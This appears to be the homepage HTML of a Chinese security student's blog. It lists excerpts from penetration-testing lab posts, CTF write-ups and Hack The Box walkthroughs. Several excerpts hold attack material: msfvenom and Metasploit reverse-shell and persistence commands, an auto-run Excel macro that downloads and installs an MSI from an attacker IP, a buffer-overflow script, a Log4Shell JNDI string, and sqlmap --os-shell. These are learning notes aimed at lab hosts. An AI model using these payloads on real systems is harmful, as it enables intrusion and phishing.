@@ -1,0 +1,655 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>alpha's blog - (￣o￣) . z Z</title><meta name="author" content="alpha"><meta name="copyright" content="alpha"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta property="og:type" content="website">
+<meta property="og:title" content="alpha&#39;s blog">
+<meta property="og:url" content="https://a1pha.cn/index.html">
+<meta property="og:site_name" content="alpha&#39;s blog">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img.a1pha.cn/blog/logo.jpg">
+<meta property="article:author" content="alpha">
+<meta property="article:tag" content="博客, alpha, blog">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img.a1pha.cn/blog/logo.jpg"><link rel="shortcut icon" href="https://img.a1pha.cn/blog/blog_ico.png"><link rel="canonical" href="https://a1pha.cn/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'alpha\'s blog',
+  isPost: false,
+  isHome: true,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2024-03-20 20:12:57'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/double_row.css"><link rel="stylesheet" href="/css/bg.css"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Zfour/Butterfly-double-row-display@1.00/cardlistpost.min.css"/>
+<style>#recent-posts > .recent-post-item >.recent-post-info > .article-meta-wrap > .tags:before {content:"\A";
+  white-space: pre;}#recent-posts > .recent-post-item >.recent-post-info > .article-meta-wrap > .tags > .article-meta__separator{display:none}</style>
+<link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiperstyle.css" media="print" onload="this.media='all'"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.0.0"><link href="https://cdn.bootcss.com/KaTeX/0.11.1/katex.min.css" rel="stylesheet" /></head><body><script>window.paceOptions = {
+  restartOnPushState: false
+}
+
+document.addEventListener('pjax:send', () => {
+  Pace.restart()
+})
+</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js/themes/blue/pace-theme-minimal.min.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://img.a1pha.cn/blog/logo.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">35</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">29</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-pen"></i><span> 文章</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="page" id="body-wrap"><header class="full_page" id="page-header" style="background-image: url('https://img.a1pha.cn/blog/bg-1.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="alpha's blog"><span class="site-name">alpha's blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-pen"></i><span> 文章</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="site-info"><h1 id="site-title">alpha's blog</h1><div id="site-subtitle"><span id="subtitle"></span></div><div id="site_social_icons"><a class="social-icon" href="https://github.com/a1phaaa" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:crzliang@outlook.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div id="scroll-down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout" id="content-inner"><div class="recent-posts" id="recent-posts"><div class="recent-post-item"><div class="post_cover left"><a href="/archives/23677/" title="Freefloat FTP Server1.0 溢出漏洞复现"><img class="post-bg" src="https://img.a1pha.cn/img/202312071129688.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Freefloat FTP Server1.0 溢出漏洞复现"></a></div><div class="recent-post-info"><a class="article-title" href="/archives/23677/" title="Freefloat FTP Server1.0 溢出漏洞复现">Freefloat FTP Server1.0 溢出漏洞复现</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-12-04T16:00:00.000Z" title="发表于 2023-12-05 00:00:00">2023-12-05</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C/">网络渗透测试技术实验</a></span></div><div class="content">分析漏洞
+在xp靶机上开启FTPServer
+
+在kali上连接ftp，直接输入aaa/aaa即可进行登录，可以登陆成功，即该服务器并没有对用户进行限制
+
+利用python生成一百个’a’登录，报错了
+wireshark抓包得知，只发送出去了78个a
+同时发送了100个a也没令软件崩溃，所以改用其他方法
+使用脚本测试
+python发包测试
+12345from pwn import *p = remote(&quot;192.168.100.143&quot;, 21)payload = &#x27;A&#x27;*500p.sendline(payload)p.interactive()
+
+程序崩溃了
+
+此时eip指向了0x41414141，从发送的数据’A’的ascii码是0x41得知，USER输入点存在栈溢出漏洞
+
+进一步的验证分析就不进行了，网上有更详细的分析过程
+漏洞利用
+寻找jmp esp地址
+
+
+
+
+
+只有一个地址，那就用：77D4754A这个地址
+生成shellcode
+利用metasploit生成windows反弹shell的shellcode，排除坏数据’\x00\x ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/archives/7517/" title="应急响应技术"><img class="post-bg" src="https://img.a1pha.cn/img/202312071152526.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="应急响应技术"></a></div><div class="recent-post-info"><a class="article-title" href="/archives/7517/" title="应急响应技术">应急响应技术</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-12-03T16:00:00.000Z" title="发表于 2023-12-04 00:00:00">2023-12-04</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C/">网络渗透测试技术实验</a></span></div><div class="content">Linux 入侵查杀
+使用history可以看到历史运行命令，从第22到25条命令可以看到在桌面有一个shell.sh的文件
+
+把文件提取出来，然后使用微步云在线沙箱进行查杀分析
+
+检测出有反弹shell的行为
+世界杀毒网并没有检测出来
+
+然后排查ssh日志，我的机器上没有发现异常日志
+Ubuntu的ssh日志是在记录在/var/log/auth.log里面的
+
+Windows 入侵查杀
+
+下列是在Windows7的环境下使用phpstudy+ucms搭建一个简易的网站，利用CVE-2020-25483上传一句话木马，实验指导书是使用phpmyadmin的弱口令进入后台，通过修改日志目录实现了恶意文件的写入，从而被上马。
+
+使用360星图分析access日志文件，日志文件在C:\phpStudy\Apache\logs目录下，此时的目录并没有access文件
+
+需要修改C:\phpStudy\Apache\conf下的httpd.conf文件，去掉红框前的注释符号，然后重启服务即可
+
+开启360星图，在运行前需要修改其配置文件，添加我们的日志地址
+
+然后运行星图根目录下的start文件 ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/archives/52264/" title="权限维持技术"><img class="post-bg" src="https://img.a1pha.cn/img/202312071143184.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="权限维持技术"></a></div><div class="recent-post-info"><a class="article-title" href="/archives/52264/" title="权限维持技术">权限维持技术</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-12-02T16:00:00.000Z" title="发表于 2023-12-03 00:00:00">2023-12-03</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C/">网络渗透测试技术实验</a></span></div><div class="content">
+这篇文章是在做网络渗透测试技术实验的时候写的，主要是以学习为目的
+其中也还有很多的不足之处
+
+windows 权限维持 注册后门
+在获得shell后background退出
+选择注册表后门模块
+1use exploit/windows/local/persistence
+然后选择好攻击模块设置参数，攻击机IP和端口，还有设置会话
+12345set payload windows/x64/meterpreter/reverse_tcp  //这句可以不写，因为默认攻击模块就是这个set lhost 192.168.100.133set lport 4455set session 1run
+
+在靶机的对应目录下找到了vbs文件
+目录：C:\Users\win7\AppData\Local\Temp\
+
+win+r打开运行输入regedit回车即可打开注册表
+然后在KCU\Software\Microsoft\Windows\CurrentVersion\Run下即可看到注册表也成功写入
+回到攻击机设置msf，让两个红框的内容一致，执行run之后，重启靶机，即可发现，在登录了靶机之后msf ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/archives/59627/" title="社会工程学钓鱼样本的制作"><img class="post-bg" src="https://img.a1pha.cn/img/202312071153243.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="社会工程学钓鱼样本的制作"></a></div><div class="recent-post-info"><a class="article-title" href="/archives/59627/" title="社会工程学钓鱼样本的制作">社会工程学钓鱼样本的制作</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-12-01T16:00:00.000Z" title="发表于 2023-12-02 00:00:00">2023-12-02</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C/">网络渗透测试技术实验</a></span></div><div class="content">excel 宏
+输入下列命令后，即可在目录下看到生成的msi
+1msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.100.129 lport=1234 -f msi -o diaoyu.msi
+
+然后启动msf，使用multi/handler模块，并设置好对应的payload，然后输入run，进行监听
+
+然后启动python的http服务，是为了后续制作宏的时候提供有网络服务
+
+在自己的电脑上创建一个excel表格（实际情况下，文件名要符合实际，有吸引力，里面的内容最好也是真实的，这里因为是实验环境，所以数据都是捏造的）
+
+然后插入宏表
+
+
+打开浏览器输入kali的ip地址，看到下图后右键diaoyu.msi，选择复制链接地址
+
+然后在表格第一行输入
+=EXEC(“msiexec /q /i http://192.168.100.129/shell.msi”)
+第二行输入
+=HALT()
+然后选择A1的框，把A1改成Auto_Open（让excel打开时自动执行宏)然后回车即可
+
+然后就是隐藏宏，右键“宏1”，然 ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/archives/28937/" title="vscode网页版搭建"><img class="post-bg" src="https://alpha-blog-1300014916.cos.ap-guangzhou.myqcloud.com/blog/vscode.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="vscode网页版搭建"></a></div><div class="recent-post-info"><a class="article-title" href="/archives/28937/" title="vscode网页版搭建">vscode网页版搭建</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-07-31T05:40:48.000Z" title="发表于 2023-07-31 13:40:48">2023-07-31</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/vscode/">vscode</a></span></div><div class="content">前言
+
+在了解Vscode的隧道技术的时候就看到了一篇名为：《上课摸鱼必备 – Vscode网页版的搭建教程》的文章，然后发现这个还挺好玩的，而且手上有一台云服务器就搭起来试试
+
+准备工作
+
+需要一台用来起服务的机器，需要Linux环境，不一定要是云服务器，本地的服务器也可以，需要外网访问的话，云服务器会方便点，本地的服务器想外网访问那就需要内网穿透了
+下载所需的包，下载地址：https://github.com/coder/code-server/releases/
+
+我的服务器是Ubuntu22.04的所以就选了code-server-4.16.0-linux-amd64.tar.gz这个版本
+
+部署
+
+下载文件
+
+1wget https://github.com/coder/code-server/releases/download/v4.16.0/code-server-4.16.0-linux-amd64.tar.gz
+
+解压文件
+
+1tar -zxvf code-server-4.16.0-linux-amd64.tar.gz
+
+重命名
+
+1mv code-server-4 ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/archives/10397/" title="记一次不知名比赛的WP"><img class="post-bg" src="https://alpha-blog-1300014916.cos.ap-guangzhou.myqcloud.com/blog/image-20230620090120146.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="记一次不知名比赛的WP"></a></div><div class="recent-post-info"><a class="article-title" href="/archives/10397/" title="记一次不知名比赛的WP">记一次不知名比赛的WP</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-06-23T17:28:52.000Z" title="发表于 2023-06-24 01:28:52">2023-06-24</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/CTF/">CTF</a></span></div><div class="content">Reverse
+Reverse_签到
+找到main函数，就看到了flag
+
+Crypto
+easily_Caesar
+凯撒解码一把梭，key=24
+
+Misc
+medium_CTFvalues
+16进制转文本得到unicode编码
+
+unicode转ascii码得到base64字符串
+
+
+base64解码得到一个字符串，然后ascii码转文本
+
+difficult_mobile_3
+jadx打开然后全局搜索base64，找字符串后进行ascii转字符
+
+得到，把ip地址进行包裹提交
+
+Pwn
+easily_pwn_1
+程序分析：64位程序，开启了NX保护
+
+代码分析：有一个read函数和write函数，可以发现read函数（这里buf只有0x80字节，而read需要从buf中读取0x200个字节），存在溢出条件。
+
+然后找是否存在后门函数
+
+找到system函数的地址，是简单的栈溢出，找到偏移量为0x80+8，然后覆盖返回地址就可以了
+
+exp：
+123456789from pwn import *io = remote(&#x27;192.168.1.1&#x27;,9002)# i ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/archives/43226/" title="2023-桂电烽台工控CTF"><img class="post-bg" src="https://alpha-blog-1300014916.cos.ap-guangzhou.myqcloud.com/blog/ft.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2023-桂电烽台工控CTF"></a></div><div class="recent-post-info"><a class="article-title" href="/archives/43226/" title="2023-桂电烽台工控CTF">2023-桂电烽台工控CTF</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-05-21T11:43:09.000Z" title="发表于 2023-05-21 19:43:09">2023-05-21</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/CTF/">CTF</a></span></div><div class="content">线上
+异常的工程
+直接strings查找flag
+
+入侵事件
+记事本打开，然后根据题目意思，直接搜索password，就能找到准确时间（吐槽一下，题目描述错了）
+
+签到题2
+
+baby_pyc
+在线网站反编译代码
+
+解密脚本
+12345678910from Crypto.Cipher import AESimport base64password = b&#x27;ragfwQEFAAAAAAAA&#x27;iv = b&#x27;1234567812345678&#x27;encrypted_text = base64.b64decode(b&#x27;HHAOD2xCZ0XIJTrOZB4t83wnFsi824jtpiRXI1usbkQ=&#x27;)aes = AES.new(password,AES.MODE_CBC,iv)decrypted_text = aes.decrypt(encrypted_text).decode()print(decrypted_text)
+
+unseen
+因为是gif图，打开时是缺少了头文件，所以直接补充回来
+
+然后用在线网站打开分析，观察红框中 ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/archives/42291/" title="Git使用心得"><img class="post-bg" src="https://alpha-blog-1300014916.cos.ap-guangzhou.myqcloud.com/blog/git.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Git使用心得"></a></div><div class="recent-post-info"><a class="article-title" href="/archives/42291/" title="Git使用心得">Git使用心得</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-05-16T03:32:06.000Z" title="发表于 2023-05-16 11:32:06">2023-05-16</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E8%BF%90%E7%BB%B4/">运维</a></span></div><div class="content">
+使用git init进行空仓库的初始化，但是仓库是有东西的话就可以不用做这一步
+使用git status查看当前的状态，可以看到我对README.md进行了修改但是未提交
+
+
+
+使用git add .将所有添加或修改过的文件添加到暂存区
+使用git status再查看当前的状态，可以看到，文件就是被添加到了暂存区
+
+
+
+使用git commit -m &quot;提交信息&quot;提交暂存区的内容到本地仓库，“提交信息”可以修改为你对于修改的或者是新增的文件的一个描述或者做出的修改
+
+
+
+使用git remote add origin 远程仓库地址把文件添加到远程仓库
+如果是第一次提交，需要先将远程仓库的内容拉取下来，直接推送会报错，使用git pull
+使用git push把提交内容推送到远程仓库上
+
+
+</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/archives/41279/" title="CTFShow-web-命令执行"><img class="post-bg" src="https://alpha-blog-1300014916.cos.ap-guangzhou.myqcloud.com/img/wallhaven-rd1yvm_1920x1080.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CTFShow-web-命令执行"></a></div><div class="recent-post-info"><a class="article-title" href="/archives/41279/" title="CTFShow-web-命令执行">CTFShow-web-命令执行</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-04-28T14:15:59.000Z" title="发表于 2023-04-28 22:15:59">2023-04-28</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/CTFshow/">CTFshow</a></span></div><div class="content">web29
+源码：
+1234567891011121314151617181920212223 &lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-04 00:12:34# @Last Modified by:   h1xa# @Last Modified time: 2020-09-04 00:26:48# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123;    $c = $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;        eval($c);    &#125;    &#125;else&#123;    highlight_file(__FILE__);&#125; 
+分析源码得知过滤了字符串flag和i
+system(&quot;l ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/archives/35769/" title="Hack the box Unified题解"><img class="post-bg" src="https://alpha-blog-1300014916.cos.ap-guangzhou.myqcloud.com/img/hacking%20is%20fun.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Hack the box Unified题解"></a></div><div class="recent-post-info"><a class="article-title" href="/archives/35769/" title="Hack the box Unified题解">Hack the box Unified题解</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-04-03T03:32:28.000Z" title="发表于 2023-04-03 11:32:28">2023-04-03</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/HTB/">HTB</a></span></div><div class="content">
+打这个靶机的时候也是断断续续的，所以里面的目标IP前后对应不上，但是方法都是一样的。
+
+扫端口
+1nmap -sC -sV 10.129.96.149
+
+访问8080端口重定向到了8443
+看到是unifi6.4.54版本的，结合官方给的WP知道这个版本有一个CVE，可以以此为出发点进行攻击
+CVE-2021-44228的利用
+验证漏洞存在
+先验证是不是存在这个漏洞
+
+抓包，因为是https的站，所以要对burpsuite进行一些设置Burp Suite抓HTTPS数据包教程
+
+
+然后根据官方的WP，需要把remember的值改成$&#123;jndi:ldap://Tun 0的IP/o=tomcat&#125;
+验证存在
+
+实施攻击
+漏洞利用环境搭建
+
+更新&amp;&amp;安装环境
+sudo apt update
+sudo apt install openjdk-11-jdk -y
+sudo apt-get install maven
+安装工具
+git clone https://github.com/veracode-research/rogue-jndi
+cd rogue- ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/archives/28632/" title="Hack the box Vaccine题解"><img class="post-bg" src="https://alpha-blog-1300014916.cos.ap-guangzhou.myqcloud.com/img/hacking%20is%20fun.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Hack the box Vaccine题解"></a></div><div class="recent-post-info"><a class="article-title" href="/archives/28632/" title="Hack the box Vaccine题解">Hack the box Vaccine题解</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-04-02T04:10:06.000Z" title="发表于 2023-04-02 12:10:06">2023-04-02</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/HTB/">HTB</a></span></div><div class="content">
+在打靶机的时候网络有点问题，所以这份WP里的目标机器的IP前后是不一样的，但总的来说，方法大同小异
+
+扫端口
+1nmap -sC -sV 10.129.252.99
+
+开启了21、22和80端口，访问80端口，什么都没有，结合任务1和任务2，就直接练上去看有没有东西
+
+ftp
+连上以后把文件复制出来
+
+破解zip密码
+解压的时候发现是有密码的
+
+看到任务4，和经过百度知道利用zip2john去获取压缩包的hash值，然后使用john去破解hash值
+
+破解成功
+
+backup的内容
+得到了两个文件
+
+其中index.php里面有网站的管理员账号和密码，密码经过了md5加密，经过破解得到：qwerty789，这也是任务5的答案
+
+
+sql注入
+登录到后台后有个搜索框尝试有无sql注入，发现可注入，加上任务6的提示，那就直接sqlmap一把梭
+
+用burpsuite抓包保存到1.txt后，利用sqlmap进行注入，并利用--os-shell进行执行shell的命令
+
+
+注入命令：
+
+1sqlmap -r 1.txt --os-shell 
+反弹shell
+
+攻击机监听
+
+1nc -lvv ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/archives/24001/" title="wsl2修改安装路径"><img class="post-bg" src="https://alpha-blog-1300014916.cos.ap-guangzhou.myqcloud.com/img/wallhaven-9dopxx.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="wsl2修改安装路径"></a></div><div class="recent-post-info"><a class="article-title" href="/archives/24001/" title="wsl2修改安装路径">wsl2修改安装路径</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-04-01T14:19:51.000Z" title="发表于 2023-04-01 22:19:51">2023-04-01</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/wsl/">wsl</a></span></div><div class="content">暂停wsl运行
+1wsl -l -v
+
+有Running说明还在运行，需要将其停止运行
+1wsl --shutdown
+导出子系统
+导出你需要更改路径的Linux系统，例如我需要导出我的Ubuntu-22.04，并导出到d盘
+1wsl --export Ubuntu-22.04 d:\Ubuntu-22.04.tar
+在d盘就可以找到导出的文件
+
+注销子系统
+注销要导出的子系统
+1wsl --unregister Ubuntu-22.04
+
+再次查看wsl的运行情况时，就没有了Ubuntu-22.04了
+
+导入子系统
+1wsl --import Ubuntu-22.04 D:\wsl-ubuntu D:\Ubuntu-22.04.tar
+import后面是：导入系统的名称+安装的路径+打包好的系统镜像的路径
+</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/archives/22239/" title="Hack the box Oopsie题解"><img class="post-bg" src="https://alpha-blog-1300014916.cos.ap-guangzhou.myqcloud.com/img/hacking%20is%20fun.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Hack the box Oopsie题解"></a></div><div class="recent-post-info"><a class="article-title" href="/archives/22239/" title="Hack the box Oopsie题解">Hack the box Oopsie题解</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-03-23T05:56:39.000Z" title="发表于 2023-03-23 13:56:39">2023-03-23</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/HTB/">HTB</a></span></div><div class="content">扫机器
+拿到目标机器的IP，先看一下，开放了什么端口
+1nmap -sC -sV 10.129.95.191
+
